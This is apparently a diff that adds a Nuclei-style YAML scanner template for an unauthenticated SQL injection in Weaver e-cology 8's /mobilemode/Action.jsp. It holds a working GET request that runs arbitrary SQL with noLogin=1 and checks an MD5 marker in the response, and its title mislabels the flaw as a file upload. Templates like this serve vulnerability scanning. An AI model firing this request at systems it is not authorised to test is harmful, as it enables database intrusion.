@@ -1,0 +1,27 @@
+id: ecology-v8-action-sqli
+
+info:
+  name: 泛微OA e-cology Action.jsp MobileAppUploadAction 文件上传漏洞
+  author: bl
+  severity: high
+  description: |
+    泛微 e-cology 8 /mobilemode/Action.jsp 中 sql 参数过滤不严，攻击者可获取数据库信息和服务权限
+  reference:
+    - https://github.com/zan8in/pxplan/blob/fd87ef720bf9e7550512ef22bf1f84c3895e8b1c/goby_pocs/10-13-crack/redteam_20210526203708/CVD-2021-4152.go
+  classification:
+    cwe-id: CWE-89
+  tags: 泛微-协同办公OA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '0xe10adc3949'
+      - type: status
+        status:
+          - 200
